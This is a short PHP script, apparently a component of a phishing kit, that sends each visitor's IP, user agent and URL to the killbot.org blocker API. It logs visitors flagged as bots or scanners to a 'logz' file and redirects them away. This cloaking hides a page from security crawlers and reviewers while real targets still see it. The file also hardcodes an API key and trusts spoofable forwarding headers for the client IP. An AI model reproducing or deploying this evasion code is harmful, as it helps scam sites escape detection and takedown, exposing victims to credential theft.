<?php
//SNIPER BOT DETECTION BY AIDEN PEARCE
/*
 
 
 
 */
error_reporting(-1);

##########################################################################
#$config['apikey']   = 'FS0yxSYmWRs86yXlAHnHmbRz3SvmZVo55NJQ-zHmjPvMi';   
$config['apikey']   = 'FS0yxSYmWRs86yXlAHnHmbRz3SvmZVo55NJQ-zHmjPvMi';  
##########################################################################

class Sniper {
    function apikey($api_key) {
        $this->apikey = $api_key;
    }

    function get_client_ip() {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        
        return $ip;
    }
    
    function httpGet($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        return $response;
    }

    function check() {
        $ip         = $this->get_client_ip();
        $respons    = $this->httpGet("https://killbot.org/api/v1/blocker?ip=".$ip."&apikey=".$this->apikey."&ua=".urlencode($_SERVER['HTTP_USER_AGENT'])."&url=".urldecode($_SERVER['REQUEST_URI']));
        $json       = json_decode($respons,true);
        if($json['data']['block_access'] == true){
            return true;
        } else {
            return false;
        }
    }
}

$killshot = killshot;
$Sniper = new Sniper;
$Sniper->apikey( $config['apikey'] );
$standardIP = $Sniper->get_client_ip();
if($Sniper->check() == true){
    if($killshot == 1){
        markBot("SNIPER (KILLED)","../logz/botlist.txt");
        header('location: '.  redirect_to);
		exit();
    }else{}
}else{}

?>